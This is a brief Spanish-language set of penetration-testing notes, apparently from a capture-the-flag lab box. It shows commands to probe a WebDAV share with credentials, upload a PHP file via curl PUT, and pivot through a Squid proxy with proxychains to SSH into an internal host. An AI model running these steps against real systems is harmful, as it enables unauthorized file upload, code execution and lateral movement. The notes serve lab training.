```bash
davtest --url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69


cadaver http://192.168.108.122/
```

- Tras ver que tipo de archivo puedo subir
```bash
curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0.php -d @0.php 
```


- Si tengo creds y tiene el puerto 22 interno puedo autenticarme con un squid proxy, en proxychains añado
```bash
#/etc/proxychains4.conf
http 10.10.10.67 3128 webdav_tester babygurl69
#Me conecto
proxychains ssh cobb@127.0.0.1
```
